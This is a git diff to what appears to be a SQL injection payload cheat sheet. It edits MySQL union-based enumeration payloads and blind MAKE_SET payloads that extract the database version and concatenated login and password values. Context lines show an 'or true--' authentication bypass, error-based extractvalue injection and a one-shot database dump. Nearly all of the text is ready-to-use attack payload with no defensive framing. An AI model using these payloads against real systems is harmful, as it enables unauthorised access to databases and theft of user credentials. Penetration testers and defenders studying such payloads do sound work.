@@ -33,10 +33,10 @@ SELECT id FROM users WHERE username='' or true-- AND password='input2'
 # MYSQL
 MySQL Union Based
 ```
-gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
-gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
-gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
-gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
+UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
 ```
 
 
@@ -66,10 +66,10 @@ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)
 
 MySQL Blind with MAKE_SET
 ```
-MAKE_SET(YOLO<(SELECT(length(version()))),1)
-MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
-MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
-MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
+AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
+AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
+AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
+AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
 ```
 
 
@@ -88,7 +88,6 @@ MySQL DIOS - Dump in One Shot
 ```
 (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
 (select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
-
 ```
 
 # POSTGRESQL
